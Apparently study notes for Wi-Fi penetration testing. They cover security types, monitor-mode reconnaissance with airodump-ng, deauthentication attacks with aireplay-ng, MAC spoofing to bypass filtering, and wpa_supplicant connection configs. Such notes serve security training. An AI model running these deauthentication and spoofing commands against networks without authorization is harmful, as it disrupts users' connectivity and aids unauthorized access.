Wi-Fi Basics

  • SSID (Service Set Identifier): Name of the Wi-Fi network.
  • BSSID (Basic Service Set Identifier): MAC address of the access point (AP).
  • Frequency Bands:
    • 2.4 GHz: Wider range but slower speed.
    • 5 GHz: Shorter range but faster speed.
  • Encryption Protocols: Protect data and control access.

Wi-Fi Security Types

  1. WEP (Wired Equivalent Privacy):
    • Oldest and weakest encryption.
    • Uses RC4 algorithm with a short key (64-bit or 128-bit).
    • Vulnerable to attacks due to weak Initialization Vector (IV).
  1. WPA-PSK (Wi-Fi Protected Access - Pre-Shared Key):
    • Replaced WEP, stronger security.
    • Uses TKIP (Temporary Key Integrity Protocol) or AES for encryption.
    • Vulnerable to password-based attacks.
  1. WPA-Enterprise (MGT):
    • Designed for businesses.
    • Requires a RADIUS server for authentication.
    • Provides unique credentials for each user.
  1. OPN (Open Networks):
    • No encryption or password.
    • Public networks (e.g., cafes, airports) often use this.
    • Highly insecure, exposing all user traffic.

Reconnaissance

Reconnaissance is the first step in a Wi-Fi attack, where the attacker gathers information about the target network.

Goals:

  1. Identify nearby networks (SSID, BSSID, channel, encryption type).
  1. Discover hidden networks.
  1. Monitor network activity.
  1. Prepare the environment for further attacks.

1.Setup Interfaces

Steps:

  1. List Wi-Fi Interfaces:
    • Command: iwconfig
    • This shows all available wireless interfaces.
  1. Enable Monitor Mode:
    • Monitor mode allows your Wi-Fi card to capture packets from all nearby networks.

    airmon-ng start wlan0

    • Result: Creates a new interface like wlan0mon
    • Check Status:
      • Command: iwconfig wlan0mon
      • Ensure the interface is in monitor mode.
    • Disable Monitor Mode:
      • After usage, return to managed mode:

      airmon-ng stop wlan0mon

2. Monitor Networks

Steps:

  1. Scan Nearby Networks:
    • Command: airodump-ng wlan0mon
    • Displays:
      • SSID: Network name.
      • BSSID: MAC address of the access point.
      • Channel: Frequency channel used by the network.
      • Encryption: Type of encryption (e.g., WPA, WEP, Open).
  1. Capture Packets:
    • Command: airodump-ng -w capture --output-format pcap wlan0mon
    • Saves packets to a file for later analysis.

3. Discover Hidden Networks

Hidden networks don’t broadcast their SSID, but they can still be detected by observing beacon frames or client connections.

Steps:

  1. Run Airodump-ng:
    • Command: airodump-ng wlan0mon
    • Hidden networks will appear with SSID as <length: 0> or blank.
  1. Deauthentication Attack:
    • Force clients to reconnect to reveal the SSID.
    • Command

    aireplay-ng -0 10 -a [BSSID] wlan0mon

    • Watch airodump-ng to see the SSID appear.

4. Change Channel

Sometimes, you need to focus on a specific Wi-Fi channel to avoid missing packets.

Steps:

  1. Set Channel:
    • Command: iwconfig wlan0mon channel [number]
      • Example: iwconfig wlan0mon channel 6
    • Locks the interface to a specific channel.
  1. Monitor Specific Channel:
    • Command: airodump-ng --channel [number] wlan0mon

5. Change MAC Address

Changing your MAC address (spoofing) can anonymize your device or bypass MAC filtering.

Steps:

  1. Bring Down Interface:
    • Command: ifconfig wlan0mon down
  1. Change MAC Address:
    • Command:

    macchanger -r wlan0mon

    • r: Random MAC address.
    • m [MAC]: Set a specific MAC address.
    1. Bring Up Interface:
      • Command: ifconfig wlan0mon up
    1. Verify MAC Address:
      • Command: macchanger -s wlan0mon

Basic Usage airodump-ng

  • airodump-ng wlan0
  • This command starts monitoring the wlan0 interface for nearby wireless networks and displays information like SSID, BSSID, encryption type, channel, power level, etc.

Key Features and Shortcuts:

  1. Authentication Protocol (AUTH)
    • Displays the authentication method used by each network:
      • MGT: WPA/WPA2/WPA3 Enterprise.
      • SKA: WEP Shared Key.
      • PSK: WPA/WPA2/WPA3 Pre-shared Key.
      • OPN: WEP Open Authentication.
  1. Key Controls:
    • A key: Cycles through different display options (e.g., AP and stations, only APs, etc.).
    • S key: Cycles through different sorting options (e.g., by signal strength, BSSID, etc.).
    • I key: Inverts the sorting order (e.g., from high to low signal strength).
    • D key: Resets to the default sorting (by power level).
    • Space Bar: Freezes the display. The capture continues in the background, and the data can be analyzed at that point. Press space bar again to resume live updates.
    • Tab key: Enables or disables scrolling through the AP list. When scrolling is enabled:
      • Up and Down keys: Navigate through the list of APs.
      • Selected APs will have their associated stations highlighted.
    • M key: Cycles through color options for a selected AP to help with better visualization of data.

Key Attack Options in aireplay-ng

  • aireplay-ng --deauth 0 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

aireplay-ng is used for packet injection and executing attacks on wireless networks. Here’s a summary:

  1. Deauthentication (0): Disconnects clients to capture WPA handshakes.
  1. Fake Authentication (1): Used in WEP networks to impersonate a client.
  1. ARP Request Replay (3): Replays ARP requests in WEP to generate traffic.
  1. KoreK ChopChop (4), Fragmentation (5), Café-Latte (6): WEPspecific attacks for cracking encryption.
  1. Injection Test (9): Checks if your wireless card supports packet injection for attacks.

Focus on Deauthentication for WPA and Injection Test for verifying your card's capabilities.

Connect to AP using CLI

1. Connect to Open Network

open.conf

network={ssid="open-network"
	key_mgmt=NONE
	scan_ssid=1
}
  • open Wi-Fi network (no password required)
  • ssid="open-network": The name of the Wi-Fi network to connect to.
  • key_mgmt=NONE: No encryption or authentication (open network).
  • scan_ssid=1: Actively scans for the network, even if it's hidden.

2. Connect to PSK (WPA2) Networks

WPA2.conf

network={ssid="psk-network"
    psk="password"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
  • WPA2-PSK network named psk-network using the password password
  • key_mgmt=WPA-PSK: Uses WPA-PSK for security.
  • proto=WPA2: Uses WPA2 encryption.

3. Connect to WPA (MGT) Enterprise

WPAMGT.conf

network={ssid="mgt-mschap-network"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
#anonymous_identity="DOMAIN\anonymous"identity="DOMAIN\username"
    password="password"
    phase1="peapver=1"
#ca_cert="/root/certs/ca.crt"#ieee80211w=0phase2="auth=MSCHAPV2"
}
  • key_mgmt=WPA-EAP: Uses WPA-EAP for enterprise authentication.
  • eap=PEAP: Specifies PEAP as the authentication method.
  • identity="DOMAIN\username": The username for authentication.
  • password="password": The password for the username.
  • phase2="auth=MSCHAPV2": Uses MSCHAPv2 for the second phase of authentication.

4. Connect to WEP Network

WEP.conf

wep-conf
network={ssid="wep-network"
  key_mgmt=NONE
  wep_key0=123456789a
  wep_tx_keyidx=0
}
  • WEP network (wep-network) using the key 123456789a for encryption.
  • key_mgmt=NONE: No key management (WEP network).
  • wep_key0=123456789a: The WEP key used for encryption.
  • wep_tx_keyidx=0: Specifies using wep_key0 for transmission.
